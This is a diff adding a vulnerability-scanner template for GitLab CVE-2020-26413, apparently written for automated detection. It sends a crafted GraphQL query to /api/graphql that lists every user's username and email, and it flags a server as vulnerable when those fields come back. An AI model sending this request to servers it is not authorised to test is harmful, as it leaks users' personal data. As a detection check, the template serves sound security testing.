@@ -1,0 +1,25 @@
+name: GitLab Graphql Email information disclosure (CVE-2020-26413)
+manual: true
+query: app="GitLab"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /api/graphql
+      headers:
+        Content-Type: application/json
+      body: '{"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status
+        {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n
+        }","variables":null,"operationName":null}'
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"username") &&
+      response.body.bcontains(b"email") && response.body.bcontains(b"@")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: In gitlab, the user's mailbox and user name will be disclosed when
+    the constructed data is input by the graphql interface
+  tags: Disclosure of Sensitive Information
